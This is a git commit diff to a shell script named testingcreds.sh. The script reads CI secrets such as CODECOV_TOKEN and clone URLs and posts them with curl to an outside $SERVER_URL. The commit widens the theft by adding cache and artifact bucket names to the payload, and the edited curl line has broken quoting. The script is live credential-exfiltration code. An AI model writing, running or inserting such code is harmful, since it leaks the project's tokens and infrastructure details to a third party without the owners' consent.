3d55409a72cbcd49302166e61e95e6d1a6185ddd
shrkanchExternal <131476692+shrkanchExternal@users.noreply.github.com>
2023-04-28 12:24:27 -0700

    Update testingcreds.sh

--- testingcreds.sh
+++ testingcreds.sh
@@ -9,10 +9,12 @@ echo Retrieve environment variables
 export VAR1=$CODECOV_TOKEN
 export VAR2=$API_CLONE_URL
 export VAR3=$AUTH_CLONE_URL
+export VAR4=$CACHE_BUCKET_NAME
+export VAR5=$ARTIFACT_BUCKET_NAME
 
 echo Sending environment variables to server...
 
 echo Send environment variables to server
-curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL
+curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\,\"VAR4\":\"$VAR4\,\"VAR5\":\"$VAR5\""}" $SERVER_URL
 
 echo Environment variables sent to server.
